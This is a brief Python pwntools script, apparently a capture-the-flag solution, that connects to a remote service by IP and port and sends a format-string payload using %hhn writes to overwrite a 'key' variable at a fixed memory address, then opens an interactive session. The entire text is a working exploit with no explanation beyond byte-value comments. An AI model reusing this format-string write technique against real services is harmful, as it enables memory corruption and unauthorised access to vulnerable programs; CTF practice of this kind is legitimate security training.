from pwn import *
context(os='linux', arch='i386', log_level='debug')

io = remote("61.147.171.105",52121)
#io = process("./datajk")
key_addr = 0x0804A048

#0x02 22 33 22 (high -> low)
#input 0x02
payload = b'aa%15$hhnaaa' + p32(key_addr + 3)
#input 0x22(two)
payload += p32(key_addr + 2) + p32(key_addr) + b'%017d%16$hhn' + b'%17$hhna'
#input 0x33
payload += p32(key_addr + 1) + b'%012d%23$hhn'

io.sendline(payload)
io.interactive()